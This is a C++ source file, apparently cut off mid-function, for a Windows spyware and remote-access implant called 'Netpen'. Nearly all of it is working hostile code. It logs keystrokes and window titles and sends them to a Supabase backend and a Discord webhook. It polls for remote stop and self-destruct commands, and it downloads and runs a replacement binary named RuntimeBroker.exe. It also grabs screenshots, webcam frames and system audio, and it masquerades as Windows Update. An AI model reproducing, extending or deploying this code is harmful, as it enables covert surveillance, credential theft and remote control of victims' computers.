#include <windows.h>
#define INITGUID
#include <winhttp.h>
#include <string>
#include <vector>
#include <cstdint>
#include <ctime>
#include <wincrypt.h>
#include <bcrypt.h>
#include <gdiplus.h>
#include <dshow.h>
#include <mmdeviceapi.h>
#include <audioclient.h>
#include "config.h"

// Missing DirectShow declarations (not available in this mingw version)
static const CLSID CLSID_SampleGrabber = {0xC1F400A0,0x3F08,0x11D3,{0x9F,0x0B,0x00,0x60,0x08,0x03,0x9E,0x37}};
static const CLSID CLSID_NullRenderer = {0xC1F400A4,0x3F08,0x11D3,{0x9F,0x0B,0x00,0x60,0x08,0x03,0x9E,0x37}};
static const IID IID_ISampleGrabber = {0x6B652FFF,0x11FE,0x4fce,{0x92,0xAD,0x02,0x66,0xB5,0xD7,0xC7,0x8F}};
MIDL_INTERFACE("6B652FFF-11FE-4fce-92AD-0266B5D7C78F")
ISampleGrabber : public IUnknown {
    virtual HRESULT STDMETHODCALLTYPE SetOneShot(BOOL) = 0;
    virtual HRESULT STDMETHODCALLTYPE SetMediaType(const AM_MEDIA_TYPE*) = 0;
    virtual HRESULT STDMETHODCALLTYPE GetConnectedMediaType(AM_MEDIA_TYPE*) = 0;
    virtual HRESULT STDMETHODCALLTYPE SetBufferSamples(BOOL) = 0;
    virtual HRESULT STDMETHODCALLTYPE GetCurrentBuffer(long*, long*) = 0;
    virtual HRESULT STDMETHODCALLTYPE GetSample(IMediaSample**) = 0;
};

#ifndef NETPEN_VERSION
#define NETPEN_VERSION 0
#endif

#define SUPABASE_KEYS_PATH L"/rest/v1/keystrokes"
#define SUPABASE_CONTROL_PATH L"/rest/v1/control"
#define SUPABASE_EXEC_PATH L"/rest/v1/exec_results"
#define SUPABASE_HEARTBEAT_PATH L"/rest/v1/heartbeat?hostname=eq."
#define STORAGE_VER_PATH L"/storage/v1/object/public/Netpen/version.txt"
#define STORAGE_EXE_PATH L"/storage/v1/object/public/Netpen/RuntimeBroker.exe"

static HHOOK g_hHook = NULL;
static std::string g_winTitle;
static std::string g_keys;
static DWORD g_lastTick = 0;
static DWORD g_lastDiscord = 0;
static DWORD g_lastAutoScreenshot = 0;
static std::vector<std::string> g_triggers;
static bool g_running = true;
static bool g_selfDestructing = false;
static std::string g_hostname;
static std::string g_lastClipboard;
static std::string g_lastPasswordDigest;
static HWND g_hwnd = NULL;

static std::wstring g_supabaseHost;
static std::wstring g_supabaseKey;
static std::wstring g_supabaseServiceKey;
static std::wstring g_discordHost;
static std::wstring g_discordPath;

static void InitConfig() {
    g_supabaseHost = DecryptW(_enc_SUPABASE_HOST, sizeof(_enc_SUPABASE_HOST));
    g_supabaseKey = DecryptW(_enc_SUPABASE_ANON_KEY, sizeof(_enc_SUPABASE_ANON_KEY));
    g_supabaseServiceKey = DecryptW(_enc_SUPABASE_SERVICE_KEY, sizeof(_enc_SUPABASE_SERVICE_KEY));
    g_discordHost = DecryptW(_enc_DISCORD_HOST, sizeof(_enc_DISCORD_HOST));
    g_discordPath = DecryptW(_enc_DISCORD_PATH, sizeof(_enc_DISCORD_PATH));
}

static std::wstring ToWide(const std::string& s) {
    int len = MultiByteToWideChar(CP_UTF8, 0, s.c_str(), -1, NULL, 0);
    std::wstring buf((size_t)len - 1, 0);
    MultiByteToWideChar(CP_UTF8, 0, s.c_str(), -1, &buf[0], len);
    return buf;
}

static std::string ToNarrow(const std::wstring& s) {
    int len = WideCharToMultiByte(CP_UTF8, 0, s.c_str(), -1, NULL, 0, NULL, NULL);
    std::string buf((size_t)len - 1, 0);
    WideCharToMultiByte(CP_UTF8, 0, s.c_str(), -1, &buf[0], len, NULL, NULL);
    return buf;
}

static std::string EscapeJSON(const std::string& s) {
    std::string out;
    out.reserve(s.size() + 8);
    for (size_t i = 0; i < s.size(); i++) {
        char c = s[i];
        switch (c) {
            case '"': out += "\\\""; break;
            case '\\': out += "\\\\"; break;
            case '\n': out += "\\n"; break;
            case '\r': out += "\\r"; break;
            case '\t': out += "\\t"; break;
            default:
                if ((unsigned char)c < 0x20) {
                    char buf[8];
                    sprintf_s(buf, 8, "\\u%04x", (unsigned char)c);
                    out += buf;
                } else {
                    out += c;
                }
        }
    }
    return out;
}

static std::string ExtractJSONString(const std::string& json, const std::string& key) {
    std::string search = "\"" + key + "\":\"";
    size_t pos = json.find(search);
    if (pos == std::string::npos) return "";
    pos += search.size();
    std::string result;
    while (pos < json.size()) {
        char c = json[pos];
        if (c == '\\') {
            pos++;
            if (pos >= json.size()) break;
            if (json[pos] == '"') result += '"';
            else if (json[pos] == '\\') result += '\\';
            else if (json[pos] == 'n') result += '\n';
            else if (json[pos] == 'r') result += '\r';
            else if (json[pos] == 't') result += '\t';
            else { result += '\\'; result += json[pos]; }
        } else if (c == '"') {
            break;
        } else {
            result += c;
        }
        pos++;
    }
    return result;
}

static std::string ExtractJSONNumber(const std::string& json, const std::string& key) {
    std::string search = "\"" + key + "\":";
    size_t pos = json.find(search);
    if (pos == std::string::npos) return "";
    pos += search.size();
    while (pos < json.size() && (json[pos] == ' ' || json[pos] == '\t')) pos++;
    size_t end = json.find_first_of(",}]", pos);
    if (end == std::string::npos) return "";
    return json.substr(pos, end - pos);
}

static std::string GetTimestamp() {
    time_t now = time(NULL);
    struct tm* tm = gmtime(&now);
    char buf[32] = {0};
    strftime(buf, sizeof(buf), "%Y-%m-%dT%H:%M:%SZ", tm);
    return std::string(buf);
}

static std::string GetExeName() {
    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);
    std::string full(path);
    size_t pos = full.find_last_of("\\/");
    if (pos != std::string::npos) return full.substr(pos + 1);
    return full;
}

static std::wstring GetExeNameW() {
    return ToWide(GetExeName());
}

static std::string GetWindowTitle() {
    char buf[512] = {0};
    HWND hwnd = GetForegroundWindow();
    if (hwnd) GetWindowTextA(hwnd, buf, sizeof(buf) - 1);
    return std::string(buf);
}

static std::string GetKeyString(DWORD vk) {
    bool shift = (GetKeyState(VK_SHIFT) & 0x8000) != 0;
    bool caps = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
    bool upper = shift ^ caps;

    if (vk >= 'A' && vk <= 'Z') {
        char c = upper ? (char)vk : (char)(vk + 32);
        return std::string(1, c);
    }

    if (vk >= '0' && vk <= '9') {
        const char* shiftNums = ")!@#$%^&*(";
        char c = shift ? shiftNums[vk - '0'] : (char)vk;
        return std::string(1, c);
    }

    switch (vk) {
        case VK_SPACE: return " ";
        case VK_RETURN: return "[Enter]";
        case VK_TAB: return "[Tab]";
        case VK_BACK: return "[Back]";
        case VK_DELETE: return "[Del]";
        case VK_ESCAPE: return "[Esc]";
        case VK_UP: return "[Up]";
        case VK_DOWN: return "[Down]";
        case VK_LEFT: return "[Left]";
        case VK_RIGHT: return "[Right]";
        case VK_HOME: return "[Home]";
        case VK_END: return "[End]";
        case VK_PRIOR: return "[PgUp]";
        case VK_NEXT: return "[PgDn]";
        case VK_INSERT: return "[Ins]";
        case VK_SNAPSHOT: return "[PrtSc]";
        case VK_PAUSE: return "[Pause]";
        case VK_APPS: return "[Menu]";
        case VK_CAPITAL: case VK_NUMLOCK: case VK_SCROLL: return "";
        case VK_SHIFT: case VK_LSHIFT: case VK_RSHIFT: return "";
        case VK_CONTROL: case VK_LCONTROL: case VK_RCONTROL: return "";
        case VK_MENU: case VK_LMENU: case VK_RMENU: return "";
        case VK_LWIN: case VK_RWIN: return "";
        case VK_VOLUME_MUTE: case VK_VOLUME_DOWN: case VK_VOLUME_UP: return "";
        case VK_MEDIA_NEXT_TRACK: case VK_MEDIA_PREV_TRACK: return "";
        case VK_MEDIA_STOP: case VK_MEDIA_PLAY_PAUSE: return "";
        default: break;
    }

    if (vk >= VK_F1 && vk <= VK_F24) {
        char buf[16];
        sprintf_s(buf, 16, "[F%d]", vk - VK_F1 + 1);
        return std::string(buf);
    }

    switch (vk) {
        case VK_OEM_1: return shift ? ":" : ";";
        case VK_OEM_PLUS: return shift ? "+" : "=";
        case VK_OEM_COMMA: return shift ? "<" : ",";
        case VK_OEM_MINUS: return shift ? "_" : "-";
        case VK_OEM_PERIOD: return shift ? ">" : ".";
        case VK_OEM_2: return shift ? "?" : "/";
        case VK_OEM_3: return shift ? "~" : "`";
        case VK_OEM_4: return shift ? "{" : "[";
        case VK_OEM_5: return shift ? "|" : "\\";
        case VK_OEM_6: return shift ? "}" : "]";
        case VK_OEM_7: return shift ? "\"" : "'";
        case VK_OEM_102: return shift ? "|" : "\\";
        case VK_DIVIDE: return "/";
        case VK_MULTIPLY: return "*";
        case VK_SUBTRACT: return "-";
        case VK_ADD: return "+";
        case VK_DECIMAL: return ".";
        default: break;
    }

    if (vk >= VK_NUMPAD0 && vk <= VK_NUMPAD9) {
        char c = '0' + (vk - VK_NUMPAD0);
        return std::string(1, c);
    }

    return "";
}

static void LogMsg(const std::string& msg) {
    char tmp[MAX_PATH];
    GetTempPathA(MAX_PATH, tmp);
    std::string logPath = std::string(tmp) + "wuaueng.log";
    FILE* f = NULL;
    fopen_s(&f, logPath.c_str(), "a");
    if (f) {
        fprintf(f, "[%s] %s\n", GetTimestamp().c_str(), msg.c_str());
        fclose(f);
    }
}

static bool HttpRequest(const wchar_t* method, const wchar_t* path, const std::string& body, std::string& response) {
    HINTERNET hSession = WinHttpOpen(L"WindowsUpdate/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
    if (!hSession) return false;

    WinHttpSetTimeouts(hSession, 5000, 5000, 5000, 5000);

    HINTERNET hConnect = WinHttpConnect(hSession, g_supabaseHost.c_str(), INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConnect) { WinHttpCloseHandle(hSession); return false; }

    HINTERNET hRequest = WinHttpOpenRequest(hConnect, method, path, NULL, NULL, NULL, WINHTTP_FLAG_SECURE);
    if (!hRequest) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return false; }

    std::wstring headers = L"apikey: ";
    headers += g_supabaseKey;
    headers += L"\r\nAuthorization: Bearer ";
    headers += g_supabaseKey;
    headers += L"\r\nContent-Type: application/json";

    BOOL sent = FALSE;
    if (body.empty()) {
        sent = WinHttpSendRequest(hRequest, headers.c_str(), headers.length(), NULL, 0, 0, 0);
    } else {
        sent = WinHttpSendRequest(hRequest, headers.c_str(), headers.length(), (LPVOID)body.c_str(), (DWORD)body.size(), (DWORD)body.size(), 0);
    }

    if (!sent) {
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return false;
    }

    if (!WinHttpReceiveResponse(hRequest, NULL)) {
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return false;
    }

    std::string result;
    DWORD size = 0;
    while (WinHttpQueryDataAvailable(hRequest, &size) && size > 0) {
        char* buf = new char[size + 1];
        ZeroMemory(buf, size + 1);
        DWORD downloaded = 0;
        if (WinHttpReadData(hRequest, buf, size, &downloaded) && downloaded > 0) {
            result.append(buf, downloaded);
        }
        delete[] buf;
    }

    response = result;
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    return true;
}

static bool PostKeys(const std::string& json) {
    std::string response;
    return HttpRequest(L"POST", SUPABASE_KEYS_PATH, json, response);
}

static bool HttpGetToString(const wchar_t* path, std::string& response) {
    HINTERNET hSession = WinHttpOpen(L"WindowsUpdate/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
    if (!hSession) return false;
    WinHttpSetTimeouts(hSession, 5000, 5000, 5000, 5000);
    HINTERNET hConnect = WinHttpConnect(hSession, g_supabaseHost.c_str(), INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConnect) { WinHttpCloseHandle(hSession); return false; }
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", path, NULL, NULL, NULL, WINHTTP_FLAG_SECURE);
    if (!hRequest) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return false; }
    if (!WinHttpSendRequest(hRequest, NULL, 0, NULL, 0, 0, 0)) { WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return false; }
    if (!WinHttpReceiveResponse(hRequest, NULL)) { WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return false; }
    std::string result;
    DWORD size = 0;
    while (WinHttpQueryDataAvailable(hRequest, &size) && size > 0) {
        char* buf = new char[size + 1];
        ZeroMemory(buf, size + 1);
        DWORD downloaded = 0;
        if (WinHttpReadData(hRequest, buf, size, &downloaded) && downloaded > 0)
            result.append(buf, downloaded);
        delete[] buf;
    }
    response = result;
    WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession);
    return true;
}

static bool HttpDownloadToFile(const wchar_t* path, const char* outputPath) {
    HINTERNET hSession = WinHttpOpen(L"WindowsUpdate/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
    if (!hSession) return false;
    WinHttpSetTimeouts(hSession, 15000, 15000, 15000, 15000);
    HINTERNET hConnect = WinHttpConnect(hSession, g_supabaseHost.c_str(), INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConnect) { WinHttpCloseHandle(hSession); return false; }
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", path, NULL, NULL, NULL, WINHTTP_FLAG_SECURE);
    if (!hRequest) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return false; }
    if (!WinHttpSendRequest(hRequest, NULL, 0, NULL, 0, 0, 0)) { WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return false; }
    if (!WinHttpReceiveResponse(hRequest, NULL)) { WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return false; }
    HANDLE hFile = CreateFileA(outputPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) { WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return false; }
    DWORD size = 0;
    bool ok = true;
    while (WinHttpQueryDataAvailable(hRequest, &size) && size > 0) {
        char* buf = new char[size];
        DWORD downloaded = 0;
        if (WinHttpReadData(hRequest, buf, size, &downloaded) && downloaded > 0) {
            DWORD written = 0;
            if (!WriteFile(hFile, buf, downloaded, &written, NULL) || written != downloaded) { ok = false; delete[] buf; break; }
        }
        delete[] buf;
    }
    CloseHandle(hFile);
    WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession);
    if (!ok) { DeleteFileA(outputPath); return false; }
    return true;
}

static bool IsSpamText(const std::string& s) {
    if (s.size() <= 5) return false;
    bool seen[256] = {false};
    int unique = 0;
    for (size_t i = 0; i < s.size(); i++) {
        if (!seen[(unsigned char)s[i]]) {
            seen[(unsigned char)s[i]] = true;
            unique++;
            if (unique >= 3) return false;
        }
    }
    return true;
}

static void PostToDiscord(const std::string& hostname, const std::string& window, const std::string& keys) {
    if (IsSpamText(keys)) return;
    DWORD now = GetTickCount();
    if (now - g_lastDiscord < 30000) return;
    g_lastDiscord = now;
    std::string host = hostname.empty() ? "unknown" : hostname;
    std::string win = window.empty() ? "unknown" : window;
    std::string k = keys.empty() ? "(no keys)" : keys;
    if (k.size() > 1990) k = k.substr(0, 1990) + "...";

    std::string payload = "{\"embeds\":[{\"title\":\"Netpen \\u2014 ";
    payload += EscapeJSON(host);
    payload += "\",\"color\":3066993,\"fields\":[{\"name\":\"Window\",\"value\":\"";
    payload += EscapeJSON(win);
    payload += "\",\"inline\":false}],\"description\":\"";
    payload += EscapeJSON(k);
    payload += "\",\"timestamp\":\"";
    payload += GetTimestamp();
    payload += "\"}]}";

    HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
    if (!hSession) return;
    WinHttpSetTimeouts(hSession, 5000, 5000, 5000, 5000);

    HINTERNET hConnect = WinHttpConnect(hSession, g_discordHost.c_str(), INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConnect) { WinHttpCloseHandle(hSession); return; }

    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", g_discordPath.c_str(), NULL, NULL, NULL, WINHTTP_FLAG_SECURE);
    if (!hRequest) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return; }

    std::wstring headers = L"Content-Type: application/json";
    WinHttpSendRequest(hRequest, headers.c_str(), headers.length(), (LPVOID)payload.c_str(),
        (DWORD)payload.size(), (DWORD)payload.size(), 0);
    WinHttpReceiveResponse(hRequest, NULL);
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
}

static bool CheckStop() {
    std::wstring query = SUPABASE_CONTROL_PATH;
    query += L"?command=eq.stop&executed=eq.false&hostname=eq.";
    query += ToWide(g_hostname);
    query += L"&select=id";
    std::string response;
    if (!HttpRequest(L"GET", query.c_str(), "", response)) return false;
    if (response.empty() || response == "[]") return false;
    return true;
}

static std::string GetExeDir() {
    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);
    std::string full(path);
    size_t pos = full.find_last_of("\\/");
    if (pos != std::string::npos) return full.substr(0, pos + 1);
    return "";
}

static void CreateKillFlag() {
    std::string flagPath = GetExeDir() + ".kill";
    FILE* f = NULL;
    fopen_s(&f, flagPath.c_str(), "w");
    if (f) fclose(f);
}

static bool KillFlagExists() {
    FILE* f = NULL;
    std::string flagPath = GetExeDir() + ".kill";
    fopen_s(&f, flagPath.c_str(), "r");
    if (f) { fclose(f); return true; }
    return false;
}

static void RemoveKillFlag() {
    std::string flagPath = GetExeDir() + ".kill";
    DeleteFileA(flagPath.c_str());
}

static bool CheckSelfDestruct() {
    std::wstring query = SUPABASE_CONTROL_PATH;
    query += L"?command=eq.selfdestruct&executed=eq.false&hostname=eq.";
    query += ToWide(g_hostname);
    query += L"&select=id";
    std::string response;
    if (!HttpRequest(L"GET", query.c_str(), "", response)) return false;
    if (response.empty() || response == "[]") return false;
    return true;
}

static int GetRemoteVersion() {
    std::string s;
    if (!HttpGetToString(STORAGE_VER_PATH, s)) return -1;
    while (!s.empty() && (s.back() == '\r' || s.back() == '\n' || s.back() == ' ' || s.back() == '\t'))
        s.pop_back();
    if (s.empty()) return -1;
    return atoi(s.c_str());
}

static bool DeployUpdate(int remoteVer) {
    char tmp[MAX_PATH];
    GetTempPathA(MAX_PATH, tmp);
    std::string newExe = std::string(tmp) + "NetpenUpdate.exe";
    std::string batFile = std::string(tmp) + "NetpenUpdate.bat";
    if (!HttpDownloadToFile(STORAGE_EXE_PATH, newExe.c_str())) {
        LogMsg("Update: download failed");
        return false;
    }
    char selfPath[MAX_PATH];
    GetModuleFileNameA(NULL, selfPath, MAX_PATH);
    std::string exeName = GetExeName();
    std::string bat =
        std::string("@echo off\r\n")
        + "set \"O=" + std::string(selfPath) + "\"\r\n"
        + "set \"N=" + newExe + "\"\r\n"
        + ":w\r\ntasklist /fi \"IMAGENAME eq " + exeName + "\" 2>nul | find /i \"" + exeName + "\" >nul\r\n"
        + "if errorlevel 1 goto r\r\ntimeout /t 2 /nobreak >nul\r\ngoto w\r\n"
        + ":r\r\ncopy /y \"%N%\" \"%O%\" >nul\r\n"
        + "start \"\" \"%O%\"\r\n"
        + "del \"%N%\"\r\ndel \"%~f0\"\r\n";
    HANDLE hf = CreateFileA(batFile.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hf == INVALID_HANDLE_VALUE) { DeleteFileA(newExe.c_str()); return false; }
    DWORD w = 0;
    WriteFile(hf, bat.c_str(), (DWORD)bat.size(), &w, NULL);
    CloseHandle(hf);
    STARTUPINFOA si = {0}; si.cb = sizeof(si);
    PROCESS_INFORMATION pi = {0};
    std::string cmd = "cmd.exe /c \"" + batFile + "\"";
    if (!CreateProcessA(NULL, &cmd[0], NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        DeleteFileA(newExe.c_str()); DeleteFileA(batFile.c_str()); return false;
    }
    CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
    LogMsg("Update deployed: v" + std::to_string(remoteVer));
    return true;
}

static int GetEncoderClsid(const wchar_t* format, CLSID* clsid) {
    UINT num = 0, size = 0;
    Gdiplus::GetImageEncodersSize(&num, &size);
    if (size == 0) return -1;
    Gdiplus::ImageCodecInfo* codecs = (Gdiplus::ImageCodecInfo*)malloc(size);
    Gdiplus::GetImageEncoders(num, size, codecs);
    for (UINT i = 0; i < num; i++) {
        if (wcscmp(codecs[i].MimeType, format) == 0) { *clsid = codecs[i].Clsid; free(codecs); return i; }
    }
    free(codecs);
    return -1;
}

static void PostDiscordImage(const std::string& host, const std::string& title, const std::string& imgUrl, const std::string& desc);

static bool CaptureScreen(const char* outputPath) {
    HDC hScreenDC = GetDC(NULL);
    HDC hMemDC = CreateCompatibleDC(hScreenDC);
    int w = GetDeviceCaps(hScreenDC, HORZRES);
    int h = GetDeviceCaps(hScreenDC, VERTRES);
    HBITMAP hBitmap = CreateCompatibleBitmap(hScreenDC, w, h);
    SelectObject(hMemDC, hBitmap);
    BitBlt(hMemDC, 0, 0, w, h, hScreenDC, 0, 0, SRCCOPY);

    Gdiplus::Bitmap bitmap(hBitmap, NULL);
    CLSID clsid;
    if (GetEncoderClsid(L"image/jpeg", &clsid) < 0) {
        DeleteObject(hBitmap); DeleteDC(hMemDC); ReleaseDC(NULL, hScreenDC);
        return false;
    }

    Gdiplus::EncoderParameters eps;
    eps.Count = 1;
    eps.Parameter[0].Guid = Gdiplus::EncoderQuality;
    eps.Parameter[0].Type = Gdiplus::EncoderParameterValueTypeLong;
    eps.Parameter[0].NumberOfValues = 1;
    UINT q = 80;
    eps.Parameter[0].Value = &q;

    bool ok = bitmap.Save(ToWide(outputPath).c_str(), &clsid, &eps) == Gdiplus::Ok;
    DeleteObject(hBitmap); DeleteDC(hMemDC); ReleaseDC(NULL, hScreenDC);
    return ok;
}

static bool CaptureWebcamFrame(const char* outputPath) {
    HRESULT hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
    if (FAILED(hr)) return false;
    bool result = false;
    IGraphBuilder* pGraph = NULL;
    ICaptureGraphBuilder2* pBuilder = NULL;
    IMediaControl* pControl = NULL;
    IBaseFilter* pCapFilter = NULL;
    IBaseFilter* pNullFilter = NULL;
    IBaseFilter* pGrabberBase = NULL;
    ISampleGrabber* pGrabber = NULL;
    do {
        CoCreateInstance(CLSID_FilterGraph, NULL, CLSCTX_INPROC_SERVER, IID_IGraphBuilder, (void**)&pGraph);
        CoCreateInstance(CLSID_CaptureGraphBuilder2, NULL, CLSCTX_INPROC_SERVER, IID_ICaptureGraphBuilder2, (void**)&pBuilder);
        if (!pGraph || !pBuilder) break;
        pBuilder->SetFiltergraph(pGraph);
        ICreateDevEnum* pDevEnum = NULL;
        IEnumMoniker* pEnum = NULL;
        if (FAILED(CoCreateInstance(CLSID_SystemDeviceEnum, NULL, CLSCTX_INPROC_SERVER, IID_ICreateDevEnum, (void**)&pDevEnum))) break;
        hr = pDevEnum->CreateClassEnumerator(CLSID_VideoInputDeviceCategory, &pEnum, 0);
        pDevEnum->Release();
        if (FAILED(hr) || !pEnum) break;
        IMoniker* pMoniker = NULL;
        if (pEnum->Next(1, &pMoniker, NULL) != S_OK) { pEnum->Release(); break; }
        pEnum->Release();
        if (FAILED(pMoniker->BindToObject(0, 0, IID_IBaseFilter, (void**)&pCapFilter))) { pMoniker->Release(); break; }
        pMoniker->Release();
        pGraph->AddFilter(pCapFilter, L"Capture");
        CoCreateInstance(CLSID_SampleGrabber, NULL, CLSCTX_INPROC_SERVER, IID_ISampleGrabber, (void**)&pGrabber);
        if (!pGrabber) break;
        if (FAILED(pGrabber->QueryInterface(IID_IBaseFilter, (void**)&pGrabberBase))) break;
        AM_MEDIA_TYPE mt;
        ZeroMemory(&mt, sizeof(mt));
        mt.majortype = MEDIATYPE_Video;
        mt.subtype = MEDIASUBTYPE_RGB24;
        pGrabber->SetMediaType(&mt);
        pGraph->AddFilter(pGrabberBase, L"Grabber");
        CoCreateInstance(CLSID_NullRenderer, NULL, CLSCTX_INPROC_SERVER, IID_IBaseFilter, (void**)&pNullFilter);
        if (pNullFilter) pGraph->AddFilter(pNullFilter, L"Null");
        if (FAILED(pBuilder->RenderStream(&PIN_CATEGORY_CAPTURE, &MEDIATYPE_Video, pCapFilter, pGrabberBase, pNullFilter))) break;
        pGrabber->SetOneShot(TRUE);
        pGrabber->SetBufferSamples(TRUE);
        if (FAILED(pGraph->QueryInterface(IID_IMediaControl, (void**)&pControl))) break;
        if (FAILED(pControl->Run())) break;
        DWORD waitStart = GetTickCount();
        bool gotSample = false;
        while (GetTickCount() - waitStart < 5000) {
            OAFilterState state;
            pControl->GetState(10, &state);
            if (state == State_Running) { Sleep(300); long cb = 0; if (pGrabber->GetCurrentBuffer(&cb, NULL) == S_OK) { gotSample = true; break; } }
            Sleep(100);
        }
        if (!gotSample) break;
        long cbBuffer = 0;
        if (FAILED(pGrabber->GetCurrentBuffer(&cbBuffer, NULL))) break;
        BYTE* pBuffer = new BYTE[cbBuffer];
        if (FAILED(pGrabber->GetCurrentBuffer(&cbBuffer, (long*)pBuffer))) { delete[] pBuffer; break; }
        AM_MEDIA_TYPE actualMt;
        ZeroMemory(&actualMt, sizeof(actualMt));
        if (FAILED(pGrabber->GetConnectedMediaType(&actualMt))) { delete[] pBuffer; break; }
        VIDEOINFOHEADER* vih = (VIDEOINFOHEADER*)actualMt.pbFormat;
        if (actualMt.formattype == FORMAT_VideoInfo && actualMt.cbFormat >= sizeof(VIDEOINFOHEADER) && vih) {
            LONG w = vih->bmiHeader.biWidth;
            LONG h = abs(vih->bmiHeader.biHeight);
            BITMAPINFO bmi;
            ZeroMemory(&bmi, sizeof(bmi));
            bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
            bmi.bmiHeader.biWidth = w;
            bmi.bmiHeader.biHeight = -h;
            bmi.bmiHeader.biPlanes = 1;
            bmi.bmiHeader.biBitCount = 24;
            bmi.bmiHeader.biCompression = BI_RGB;
            HDC hdc = GetDC(NULL);
            HBITMAP hBmp = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, NULL, NULL, 0);
            if (hBmp) {
                SetBitmapBits(hBmp, cbBuffer, pBuffer);
                Gdiplus::Bitmap bitmap(hBmp, NULL);
                CLSID clsid;
                if (GetEncoderClsid(L"image/jpeg", &clsid) >= 0) {
                    Gdiplus::EncoderParameters eps;
                    eps.Count = 1;
                    eps.Parameter[0].Guid = Gdiplus::EncoderQuality;
                    eps.Parameter[0].Type = Gdiplus::EncoderParameterValueTypeLong;
                    eps.Parameter[0].NumberOfValues = 1;
                    UINT q = 80;
                    eps.Parameter[0].Value = &q;
                    result = (bitmap.Save(ToWide(outputPath).c_str(), &clsid, &eps) == Gdiplus::Ok);
                }
                DeleteObject(hBmp);
            }
            ReleaseDC(NULL, hdc);
        }
        if (actualMt.pbFormat) CoTaskMemFree(actualMt.pbFormat);
        delete[] pBuffer;
    } while (false);
    if (pControl) { pControl->Stop(); pControl->Release(); }
    if (pGrabberBase) pGrabberBase->Release();
    if (pGrabber) pGrabber->Release();
    if (pNullFilter) pNullFilter->Release();
    if (pCapFilter) pCapFilter->Release();
    if (pBuilder) pBuilder->Release();
    if (pGraph) pGraph->Release();
    CoUninitialize();
    return result;
}

static bool CaptureSpeaker(const char* outputPath) {
    HRESULT hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
    if (FAILED(hr)) return false;
    bool result = false;
    IMMDeviceEnumerator* pEnum = NULL;
    IMMDevice* pDevice = NULL;
    IAudioClient* pClient = NULL;
    IAudioCaptureClient* pCapture = NULL;
    do {
        if (FAILED(CoCreateInstance(CLSID_MMDeviceEnumerator, NULL, CLSCTX_ALL, IID_IMMDeviceEnumerator, (void**)&pEnum))) break;
        if (FAILED(pEnum->GetDefaultAudioEndpoint(eRender, eConsole, &pDevice))) break;
        if (FAILED(pDevice->Activate(IID_IAudioClient, CLSCTX_ALL, NULL, (void**)&pClient))) break;
        WAVEFORMATEX* pMixFormat = NULL;
        if (FAILED(pClient->GetMixFormat(&pMixFormat))) break;
        REFERENCE_TIME bufDuration = 10000000;
        if (FAILED(pClient->Initialize(AUDCLNT_SHAREMODE_SHARED, AUDCLNT_STREAMFLAGS_LOOPBACK, bufDuration, 0, pMixFormat, NULL))) { CoTaskMemFree(pMixFormat); break; }
        if (FAILED(pClient->GetService(IID_IAudioCaptureClient, (void**)&pCapture))) { CoTaskMemFree(pMixFormat); break; }
        UINT32 bytesPerFrame = pMixFormat->nBlockAlign;
        UINT32 estimatedBytes = pMixFormat->nSamplesPerSec * bytesPerFrame * 10;
        std::vector<BYTE> audioBuffer;
        audioBuffer.reserve(estimatedBytes + 44);
        struct WAVHDR { char id[4]; uint32_t sz; char wave[4]; char fId[4]; uint32_t fsz; uint16_t tag; uint16_t ch; uint32_t sr; uint32_t br; uint16_t ba; uint16_t bps; char dId[4]; uint32_t dsz; } hdr;
        memcpy(hdr.id, "RIFF", 4); memcpy(hdr.wave, "WAVE", 4); memcpy(hdr.fId, "fmt ", 4); memcpy(hdr.dId, "data", 4);
        hdr.fsz = 16; hdr.tag = pMixFormat->wFormatTag; hdr.ch = pMixFormat->nChannels;
